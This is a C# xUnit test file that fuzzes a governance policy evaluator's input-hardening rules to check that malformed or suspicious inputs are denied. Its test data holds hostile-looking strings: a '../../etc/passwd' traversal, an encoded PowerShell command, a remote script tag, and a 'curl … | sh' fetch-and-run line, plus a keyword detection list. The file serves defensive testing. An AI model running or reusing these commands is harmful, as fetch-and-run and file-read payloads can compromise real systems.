using System.Globalization;
using AsiBackbone.Core.Constraints;
using AsiBackbone.Core.Decisions;
using AsiBackbone.Core.Evaluation;
using AsiBackbone.Core.ThreatModeling;
using Xunit;

namespace AsiBackbone.Core.Tests.Evaluation;

/// <summary>
/// Lightweight fuzz/property-style tests for policy input hardening invariants.
/// </summary>
public sealed class PolicyInputHardeningFuzzTests
{
    private const int MaxInputLength = 1024;
    private const int MaxMetadataNestingDepth = 8;
    private const string NullRequestCase = "__NULL__";
    private const string OversizedRequestCase = "__OVERSIZED__";
    private const string ControlCharacterRequestCase = "__CONTROL__";

    /// <summary>
    /// Verifies that the <see cref="GovernanceEvaluationContext"/> constructor normalizes malformed inputs, such as whitespace-only strings and null values, to ensure consistent behavior in downstream evaluation logic.
    /// </summary>
    [Fact]
    public void ConstraintEvaluationContextNormalizesMalformedConstructionInputs()
    {
        var context = new GovernanceEvaluationContext(
            correlationId: "  corr-policy-input  ",
            policyVersion: "   ",
            policyHash: null,
            metadata: new Dictionary<string, string>(StringComparer.Ordinal)
            {
                ["   "] = "discarded",
                [" request.intent "] = " approve ",
                ["null-value"] = null!
            });

        Assert.Equal("corr-policy-input", context.CorrelationId);
        Assert.Null(context.PolicyVersion);
        Assert.Null(context.PolicyHash);
        Assert.True(context.HasMetadata);
        Assert.False(context.Metadata.ContainsKey("   "));
        Assert.Equal("approve", context.Metadata["request.intent"]);
        Assert.Equal(string.Empty, context.Metadata["null-value"]);
    }

    /// <summary>
    /// Verifies that the policy input hardening threat contributor correctly identifies and denies malformed or suspicious inputs, producing a denied decision with appropriate reason codes and metadata, while ensuring that no allow decisions are produced for such inputs.
    /// </summary>
    /// <param name="scenario">The test scenario</param>
    /// <param name="intent">The intent value</param>
    /// <param name="requestCase">The request case</param>
    /// <param name="expectedReasonCode">The expected reason code</param>
    /// <param name="region">The region value</param>
    /// <param name="capability">The capability value</param>
    /// <param name="capabilityTokenCase">The capability token case</param>
    /// <param name="acknowledgment">The acknowledgment value</param>
    /// <param name="extraMetadataCase">The extra metadata case</param>
    /// <returns></returns>
    [Theory]
    [InlineData("empty-intent", " ", "approve-safe-operation", "input.intent.empty", "US-LA", "read", null, /*lang=json,strict*/ "{\"accepted\":true}", null)]
    [InlineData("empty-request", "approve", " ", "input.request.empty", "US-LA", "read", null, /*lang=json,strict*/ "{\"accepted\":true}", null)]
    [InlineData("null-request-value", "approve", NullRequestCase, "input.request.empty", "US-LA", "read", null, /*lang=json,strict*/ "{\"accepted\":true}", null)]
    [InlineData("oversized-request-payload", "approve", OversizedRequestCase, "input.request.oversized", "US-LA", "read", null, /*lang=json,strict*/ "{\"accepted\":true}", null)]
    [InlineData("deeply-nested-metadata", "approve", "safe", "input.metadata.too_deep", "US-LA", "read", null, /*lang=json,strict*/ "{\"accepted\":true}", "deep-metadata")]
    [InlineData("control-character-payload", "approve", ControlCharacterRequestCase, "input.control_character", "US-LA", "read", null, /*lang=json,strict*/ "{\"accepted\":true}", null)]
    [InlineData("unicode-confusable-capability", "approve", "safe", "input.unicode_confusable", "US-LA", "admіn", null, /*lang=json,strict*/ "{\"accepted\":true}", null)]
    [InlineData("duplicate-conflicting-metadata-keys", "approve", "safe", "input.metadata.conflicting_keys", "US-LA", "read", null, /*lang=json,strict*/ "{\"accepted\":true}", "conflicting-keys")]
    [InlineData("invalid-region-code", "approve", "safe", "input.region.invalid", "moon-base-1", "read", null, /*lang=json,strict*/ "{\"accepted\":true}", null)]
    [InlineData("unknown-capability", "approve", "safe", "input.capability.unknown", "US-LA", "global-root", null, /*lang=json,strict*/ "{\"accepted\":true}", null)]
    [InlineData("malformed-capability-token", "approve", "safe", "input.capability_token.malformed", "US-LA", "read", "malformed", /*lang=json,strict*/ "{\"accepted\":true}", null)]
    [InlineData("expired-capability-token", "approve", "safe", "input.capability_token.expired", "US-LA", "read", "expired", /*lang=json,strict*/ "{\"accepted\":true}", null)]
    [InlineData("capability-token-mismatch", "approve", "safe", "input.capability_token.mismatch", "US-LA", "write", "mismatch", /*lang=json,strict*/ "{\"accepted\":true}", null)]
    [InlineData("malformed-acknowledgment-payload", "approve", "safe", "input.acknowledgment.malformed", "US-LA", "read", null, "{not-json", null)]
    [InlineData("unexpected-enum-value", "approve", "safe", "input.enum.unexpected", "US-LA", "read", null, /*lang=json,strict*/ "{\"accepted\":true}", "unexpected-enum")]
    [InlineData("path-traversal-string", "approve", "../../etc/passwd", "input.path_traversal", "US-LA", "read", null, /*lang=json,strict*/ "{\"accepted\":true}", null)]
    [InlineData("command-like-string", "approve", "powershell -EncodedCommand ZQB2AGkAbAA=", "input.command_like", "US-LA", "read", null, /*lang=json,strict*/ "{\"accepted\":true}", null)]
    [InlineData("url-script-looking-string", "approve", "<script src=https://example.invalid/payload.js></script>", "input.script_like", "US-LA", "read", null, /*lang=json,strict*/ "{\"accepted\":true}", null)]
    public async Task GeneratedMalformedPolicyInputsNeverProduceAllow(
        string scenario,
        string? intent,
        string requestCase,
        string expectedReasonCode,
        string region,
        string capability,
        string? capabilityTokenCase,
        string? acknowledgment,
        string? extraMetadataCase)
    {
        GovernanceEvaluationContext context = CreateContext(
            scenario,
            intent,
            CreateRequest(requestCase),
            region,
            capability,
            CreateCapabilityToken(capabilityTokenCase),
            acknowledgment,
            CreateExtraMetadata(extraMetadataCase));
        DefaultGovernancePolicyEvaluator<GovernanceEvaluationContext> evaluator = CreateHardenedEvaluator();

        GovernanceDecision decision = await evaluator.EvaluateAsync(context, TestContext.Current.CancellationToken);

        Assert.True(decision.IsDenied);
        Assert.False(decision.IsAllowed);
        Assert.False(decision.CanProceed);
        Assert.Equal(expectedReasonCode, Assert.Single(decision.ReasonCodes));
        Assert.Equal("corr-policy-input", decision.CorrelationId);
        Assert.Equal("v-policy-input-hardening", decision.PolicyVersion);
        Assert.Equal("sha256:policy-input-hardening", decision.PolicyHash);

        OperationReason reason = Assert.Single(decision.Reasons);
        Assert.True(reason.Metadata.TryGetValue("input.scenario", out string? metadataScenario));
        Assert.Equal(scenario, metadataScenario);
        Assert.Equal("policy-input-hardening", reason.Metadata["threat.contributor"]);
        Assert.Equal("Denied", reason.Metadata["threat.effective_outcome"]);
        Assert.True(reason.Metadata.ContainsKey("input.key"));
        Assert.True(reason.Metadata.ContainsKey("threat.category"));
    }

    /// <summary>
    /// Verifies that a valid generated policy input can produce an allow decision when the fixture is expected, ensuring that the policy evaluator correctly permits safe and well-formed requests.
    /// </summary>
    /// <returns>
    /// A task that represents the asynchronous operation of evaluating the policy with a valid generated policy input, ensuring that it results in an allow decision when the fixture is expected.
    /// </returns>
    [Fact]
    public async Task ValidGeneratedPolicyInputCanProduceAllowWhenFixtureIsExpected()
    {
        GovernanceEvaluationContext context = CreateContext(
            scenario: "valid-policy-input",
            intent: "approve",
            request: "read status from safe region",
            region: "US-LA",
            capability: "read",
            capabilityToken: CreateCapabilityToken("valid"),
            acknowledgment: /*lang=json,strict*/ "{\"accepted\":true}");
        DefaultGovernancePolicyEvaluator<GovernanceEvaluationContext> evaluator = CreateHardenedEvaluator();

        GovernanceDecision decision = await evaluator.EvaluateAsync(context, TestContext.Current.CancellationToken);

        Assert.True(decision.IsAllowed);
        Assert.True(decision.CanProceed);
        Assert.Empty(decision.ReasonCodes);
    }

    /// <summary>
    /// Verifies that when a correlation ID exceeds the maximum allowed length, the policy evaluator correctly bounds it to the maximum length and produces a denied decision, ensuring that oversized correlation IDs are handled appropriately in the evaluation process.
    /// </summary>
    /// <returns>
    /// A task that represents the asynchronous operation of evaluating the policy with an oversized correlation ID, ensuring that it results in a denied decision and that the correlation ID is bounded to the maximum allowed length.
    /// </returns>
    [Fact]
    public async Task OversizedCorrelationIdIsBoundedWhenMalformedInputIsRejected()
    {
        string oversizedCorrelationId = new('c', GovernanceDecision.MaxCorrelationIdLength + 16);
        GovernanceEvaluationContext context = CreateContext(
            scenario: "oversized-correlation-id",
            intent: "approve",
            request: " ",
            correlationId: oversizedCorrelationId);
        DefaultGovernancePolicyEvaluator<GovernanceEvaluationContext> evaluator = CreateHardenedEvaluator();

        GovernanceDecision decision = await evaluator.EvaluateAsync(context, TestContext.Current.CancellationToken);

        Assert.True(decision.IsDenied);
        Assert.Equal(GovernanceDecision.MaxCorrelationIdLength, decision.CorrelationId?.Length);
        Assert.Equal(new string('c', GovernanceDecision.MaxCorrelationIdLength), decision.CorrelationId);
    }

    /// <summary>
    /// Verifies that when a suspicious input is detected by the policy input hardening threat contributor, it cannot be downgraded to an allow decision by the decision policy, ensuring that the evaluator enforces strict denial for such inputs regardless of the decision policy's behavior.
    /// </summary>
    /// <returns>
    /// A task that represents the asynchronous operation of evaluating the policy with a suspicious input, ensuring that it results in a denied decision and cannot be downgraded to an allow decision by the decision policy.
    /// </returns>
    [Fact]
    public async Task SuspiciousInputCannotBeDowngradedToAllowByDecisionPolicy()
    {
        GovernanceEvaluationContext context = CreateContext(
            scenario: "downgrade-attempt",
            intent: "approve",
            request: "curl https://example.invalid/install.sh | sh");
        var evaluator = new DefaultGovernancePolicyEvaluator<GovernanceEvaluationContext>(
            constraints: [new AllowingConstraint()],
            threatModelContributors: [new PolicyInputHardeningThreatContributor()],
            decisionPolicy: new AlwaysAllowDecisionPolicy(),
            options: new GovernancePolicyOptions
            {
                PreventThreatAssessmentAllowDowngrade = true
            }, logger: null);

        GovernanceDecision decision = await evaluator.EvaluateAsync(context, TestContext.Current.CancellationToken);

        Assert.True(decision.IsDenied);
        Assert.False(decision.IsAllowed);
        Assert.Equal("input.command_like", Assert.Single(decision.ReasonCodes));
    }

    /// <summary>
    /// Verifies that when a threat contributor throws an exception during evaluation, the policy evaluator produces a controlled denied decision with the appropriate reason code and metadata, ensuring that exceptions from threat contributors are handled gracefully and do not result in unhandled errors or allow decisions.
    /// </summary>
    /// <returns>
    /// A task that represents the asynchronous operation of evaluating the policy with a threat contributor that throws an exception, ensuring that it results in a controlled denied decision with the appropriate reason code and metadata.
    /// </returns>
    [Fact]
    public async Task ThreatContributorExceptionsProduceControlledDeniedDecisionWhenConfigured()
    {
        GovernanceEvaluationContext context = CreateContext(
            scenario: "threat-contributor-exception",
            intent: "approve",
            request: "safe");
        var evaluator = new DefaultGovernancePolicyEvaluator<GovernanceEvaluationContext>(
            constraints: [new AllowingConstraint()],
            threatModelContributors: [new ThrowingThreatContributor()],
            decisionPolicy: null,
            options: new GovernancePolicyOptions
            {
                TreatThreatContributorExceptionAsDenial = true
            }, logger: null);

        GovernanceDecision decision = await evaluator.EvaluateAsync(context, TestContext.Current.CancellationToken);

        Assert.True(decision.IsDenied);
        Assert.False(decision.IsAllowed);
        Assert.Equal(
            GovernancePolicyOptions.DefaultThreatContributorExceptionReasonCode,
            Assert.Single(decision.ReasonCodes));
        OperationReason reason = Assert.Single(decision.Reasons);
        Assert.Equal("throwing-threat-contributor", reason.Metadata["threat.contributor"]);
        Assert.Equal(nameof(InvalidOperationException), reason.Metadata["threat.failure"]);
    }

    private static DefaultGovernancePolicyEvaluator<GovernanceEvaluationContext> CreateHardenedEvaluator()
    {
        return new DefaultGovernancePolicyEvaluator<GovernanceEvaluationContext>(
            constraints: [new AllowingConstraint()],
            threatModelContributors: [new PolicyInputHardeningThreatContributor()],
            decisionPolicy: null,
            options: new GovernancePolicyOptions
            {
                TreatThreatContributorExceptionAsDenial = true,
                PreventThreatAssessmentAllowDowngrade = true
            }, logger: null);
    }

    private static GovernanceEvaluationContext CreateContext(
        string scenario,
        string? intent,
        string? request,
        string region = "US-LA",
        string capability = "read",
        string? capabilityToken = null,
        string? acknowledgment = /*lang=json,strict*/ "{\"accepted\":true}",
        Dictionary<string, string>? extraMetadata = null,
        string correlationId = "corr-policy-input")
    {
        Dictionary<string, string> metadata = new(StringComparer.Ordinal)
        {
            ["request.intent"] = intent ?? string.Empty,
            ["request.payload"] = request ?? string.Empty,
            ["region.code"] = region,
            ["capability.name"] = capability,
            ["acknowledgment.payload"] = acknowledgment ?? string.Empty
        };

        if (!string.IsNullOrWhiteSpace(capabilityToken))
        {
            metadata["capability.token"] = capabilityToken;
        }

        if (extraMetadata is not null)
        {
            foreach (KeyValuePair<string, string> item in extraMetadata)
            {
                metadata[item.Key] = item.Value;
            }
        }

        metadata["input.scenario"] = scenario;

        return new GovernanceEvaluationContext(
            correlationId,
            policyVersion: "v-policy-input-hardening",
            policyHash: "sha256:policy-input-hardening",
            metadata: metadata);
    }

    private static string? CreateRequest(string requestCase)
    {
        return requestCase switch
        {
            NullRequestCase => null,
            OversizedRequestCase => new string('x', MaxInputLength + 1),
            ControlCharacterRequestCase => "safe\u0000payload",
            _ => requestCase
        };
    }

    private static string? CreateCapabilityToken(string? tokenCase)
    {
        return tokenCase switch
        {
            "malformed" => "not-a-token",
            "expired" => $"cap:read:{DateTimeOffset.UtcNow.AddMinutes(-5).ToString("O", CultureInfo.InvariantCulture)}",
            "mismatch" => $"cap:read:{DateTimeOffset.UtcNow.AddMinutes(5).ToString("O", CultureInfo.InvariantCulture)}",
            "valid" => $"cap:read:{DateTimeOffset.UtcNow.AddMinutes(5).ToString("O", CultureInfo.InvariantCulture)}",
            _ => null
        };
    }

    private static Dictionary<string, string>? CreateExtraMetadata(string? metadataCase)
    {
        return metadataCase switch
        {
            "deep-metadata" => MetadataWith("payload.shape", "[[[[[[[[[value]]]]]]]]]"),
            "conflicting-keys" => MetadataWith("owner", "alice", "OWNER", "bob"),
            "unexpected-enum" => MetadataWith("operation.mode", "999"),
            _ => null
        };
    }

    private static Dictionary<string, string> MetadataWith(params string[] values)
    {
        if (values.Length % 2 != 0)
        {
            throw new ArgumentException("Metadata helper requires key/value pairs.", nameof(values));
        }

        Dictionary<string, string> metadata = new(StringComparer.Ordinal);
        for (int index = 0; index < values.Length; index += 2)
        {
            metadata[values[index]] = values[index + 1];
        }

        return metadata;
    }

    private sealed class PolicyInputHardeningThreatContributor : IThreatModelContributor<GovernanceEvaluationContext>
    {
        private static readonly string[] AllowedRegions = ["US-LA", "US-TX", "US-MS"];
        private static readonly string[] AllowedCapabilities = ["read", "write", "approve"];

        public string Name => "policy-input-hardening";

        public ValueTask<ThreatAssessment> AssessAsync(
            GovernanceEvaluationContext context,
            CancellationToken cancellationToken = default)
        {
            cancellationToken.ThrowIfCancellationRequested();
            IReadOnlyDictionary<string, string> metadata = context.Metadata;
            string scenario = metadata.TryGetValue("input.scenario", out string? scenarioValue) ? scenarioValue : "generated-policy-input";
            string intent = metadata.TryGetValue("request.intent", out string? intentValue) ? intentValue : string.Empty;
            string request = metadata.TryGetValue("request.payload", out string? requestValue) ? requestValue : string.Empty;
            string region = metadata.TryGetValue("region.code", out string? regionValue) ? regionValue : string.Empty;
            string capability = metadata.TryGetValue("capability.name", out string? capabilityValue) ? capabilityValue : string.Empty;
            string acknowledgment = metadata.TryGetValue("acknowledgment.payload", out string? acknowledgmentValue) ? acknowledgmentValue : string.Empty;

            ThreatAssessment assessment =
                string.IsNullOrWhiteSpace(intent) ? Deny("input.intent.empty", "Request intent must be present.", ThreatCategories.InputMalformed, scenario, "request.intent") :
                string.IsNullOrWhiteSpace(request) ? Deny("input.request.empty", "Request payload must be present.", ThreatCategories.InputMalformed, scenario, "request.payload") :
                request.Length > MaxInputLength ? Deny("input.request.oversized", "Request payload exceeded the configured input length limit.", ThreatCategories.InputOversized, scenario, "request.payload") :
                MetadataExceedsNestingLimit(metadata) ? Deny("input.metadata.too_deep", "Metadata exceeded the configured nesting limit.", ThreatCategories.InputOversized, scenario, "metadata") :
                ContainsControlCharacters(request) ? Deny("input.control_character", "Request payload contains control characters.", ThreatCategories.InputMalformed, scenario, "request.payload") :
                ContainsUnicodeConfusable(capability) || ContainsUnicodeConfusable(request) ? Deny("input.unicode_confusable", "Input contains non-ASCII confusable characters.", ThreatCategories.InputMalformed, scenario, "capability.name") :
                ContainsConflictingMetadataKeys(metadata) ? Deny("input.metadata.conflicting_keys", "Metadata contains duplicate or conflicting keys.", ThreatCategories.PolicyBypassAttempt, scenario, "metadata") :
                !AllowedRegions.Contains(region, StringComparer.Ordinal) ? Deny("input.region.invalid", "Region code is not allowed by the host policy fixture.", ThreatCategories.RegionPolicyMismatch, scenario, "region.code") :
                !AllowedCapabilities.Contains(capability, StringComparer.Ordinal) ? Deny("input.capability.unknown", "Capability is not allowed by the host policy fixture.", ThreatCategories.CapabilityTokenMismatch, scenario, "capability.name") :
                CreateCapabilityTokenAssessment(metadata, capability, scenario) ??
                (!LooksLikeJsonObject(acknowledgment) ? Deny("input.acknowledgment.malformed", "Acknowledgment payload is malformed.", ThreatCategories.InputMalformed, scenario, "acknowledgment.payload") :
                HasUnexpectedEnumValue(metadata) ? Deny("input.enum.unexpected", "Input contained an unsupported enum value.", ThreatCategories.InputMalformed, scenario, "operation.mode") :
                ContainsPathTraversal(request) ? Deny("input.path_traversal", "Request payload contains path traversal patterns.", ThreatCategories.PolicyBypassAttempt, scenario, "request.payload") :
                ContainsCommandLikeInput(request) ? Deny("input.command_like", "Request payload looks like a command execution attempt.", ThreatCategories.UnsafeExternalCommand, scenario, "request.payload") :
                ContainsScriptLikeInput(request) ? Deny("input.script_like", "Request payload looks like a URL or script injection attempt.", ThreatCategories.PromptInjectionLikeInput, scenario, "request.payload") :
                ThreatAssessment.NoThreat());

            return new ValueTask<ThreatAssessment>(assessment);
        }

        private static ThreatAssessment? CreateCapabilityTokenAssessment(
            IReadOnlyDictionary<string, string> metadata,
            string expectedCapability,
            string scenario)
        {
            if (!metadata.TryGetValue("capability.token", out string? token) || string.IsNullOrWhiteSpace(token))
            {
                return null;
            }

            string[] parts = token.Split(':', 3, StringSplitOptions.None);
            return parts.Length != 3 || !string.Equals(parts[0], "cap", StringComparison.Ordinal)
                ? Deny("input.capability_token.malformed", "Capability token is malformed.", ThreatCategories.CapabilityTokenMismatch, scenario, "capability.token")
                : !string.Equals(parts[1], expectedCapability, StringComparison.Ordinal)
                ? Deny("input.capability_token.mismatch", "Capability token scope does not match the requested capability.", ThreatCategories.CapabilityTokenMismatch, scenario, "capability.token")
                : !DateTimeOffset.TryParse(parts[2], CultureInfo.InvariantCulture, DateTimeStyles.AssumeUniversal, out DateTimeOffset expiresAt)
                ? Deny("input.capability_token.malformed", "Capability token expiry is malformed.", ThreatCategories.CapabilityTokenMismatch, scenario, "capability.token")
                : expiresAt <= DateTimeOffset.UtcNow
                ? Deny("input.capability_token.expired", "Capability token is expired.", ThreatCategories.CapabilityTokenMismatch, scenario, "capability.token")
                : null;
        }

        private static ThreatAssessment Deny(
            string reasonCode,
            string description,
            string category,
            string scenario,
            string key)
        {
            return ThreatAssessment.Create(
                ThreatSeverity.High,
                category,
                reasonCode,
                description,
                GovernanceDecisionOutcome.Denied,
                metadata: new Dictionary<string, string>(StringComparer.Ordinal)
                {
                    ["input.scenario"] = scenario,
                    ["input.key"] = key
                });
        }

        private static bool ContainsControlCharacters(string value)
        {
            return value.Any(character => char.IsControl(character) && character is not '\r' and not '\n' and not '\t');
        }

        private static bool ContainsUnicodeConfusable(string value)
        {
            return value.Any(character => character > 127);
        }

        private static bool ContainsConflictingMetadataKeys(IReadOnlyDictionary<string, string> metadata)
        {
            HashSet<string> observed = new(StringComparer.OrdinalIgnoreCase);
            foreach (string key in metadata.Keys)
            {
                if (!observed.Add(key))
                {
                    return true;
                }
            }

            return false;
        }

        private static bool MetadataExceedsNestingLimit(IReadOnlyDictionary<string, string> metadata)
        {
            return metadata.Values.Any(value => value.Count(character => character is '[' or '{' or '(') > MaxMetadataNestingDepth);
        }

        private static bool LooksLikeJsonObject(string value)
        {
            string trimmed = value.Trim();
            return trimmed.Length >= 2 && trimmed[0] == '{' && trimmed[^1] == '}';
        }

        private static bool HasUnexpectedEnumValue(IReadOnlyDictionary<string, string> metadata)
        {
            return metadata.TryGetValue("operation.mode", out string? value)
                && int.TryParse(value, NumberStyles.Integer, CultureInfo.InvariantCulture, out int parsed)
                && !Enum.IsDefined(typeof(TestOperationMode), parsed);
        }

        private static bool ContainsPathTraversal(string value)
        {
            return value.Contains("../", StringComparison.Ordinal) || value.Contains("..\\", StringComparison.Ordinal);
        }

        private static bool ContainsCommandLikeInput(string value)
        {
            return value.Contains("powershell", StringComparison.OrdinalIgnoreCase)
                || value.Contains("encodedcommand", StringComparison.OrdinalIgnoreCase)
                || value.Contains("curl ", StringComparison.OrdinalIgnoreCase)
                || value.Contains(" | sh", StringComparison.OrdinalIgnoreCase);
        }

        private static bool ContainsScriptLikeInput(string value)
        {
            return value.Contains("<script", StringComparison.OrdinalIgnoreCase)
                || value.Contains("javascript:", StringComparison.OrdinalIgnoreCase)
                || (value.Contains("http://", StringComparison.OrdinalIgnoreCase) && value.Contains(".js", StringComparison.OrdinalIgnoreCase))
                || (value.Contains("https://", StringComparison.OrdinalIgnoreCase) && value.Contains(".js", StringComparison.OrdinalIgnoreCase));
        }
    }

    private enum TestOperationMode
    {
        Read = 1,
        Write = 2,
        Approve = 3
    }

    private sealed class AllowingConstraint : IGovernanceConstraint<GovernanceEvaluationContext>
    {
        public string Name => "allowing-constraint";

        public ValueTask<ConstraintEvaluationResult> EvaluateAsync(
            GovernanceEvaluationContext context,
            CancellationToken cancellationToken = default)
        {
            return new ValueTask<ConstraintEvaluationResult>(ConstraintEvaluationResult.Allow());
        }
    }

    private sealed class AlwaysAllowDecisionPolicy : IGovernanceDecisionPolicy<GovernanceEvaluationContext>
    {
        public ValueTask<GovernanceDecision> ApplyAsync(
            GovernanceEvaluationContext context,
            GovernanceDecision composedDecision,
            IReadOnlyList<ConstraintEvaluationResult> constraintResults,
            CancellationToken cancellationToken = default)
        {
            return new ValueTask<GovernanceDecision>(GovernanceDecision.Allow(
                correlationId: context.CorrelationId,
                policyVersion: context.PolicyVersion,
                policyHash: context.PolicyHash));
        }
    }

    private sealed class ThrowingThreatContributor : IThreatModelContributor<GovernanceEvaluationContext>
    {
        public string Name => "throwing-threat-contributor";

        public ValueTask<ThreatAssessment> AssessAsync(
            GovernanceEvaluationContext context,
            CancellationToken cancellationToken = default)
        {
            throw new InvalidOperationException("Simulated contributor failure.");
        }
    }
}
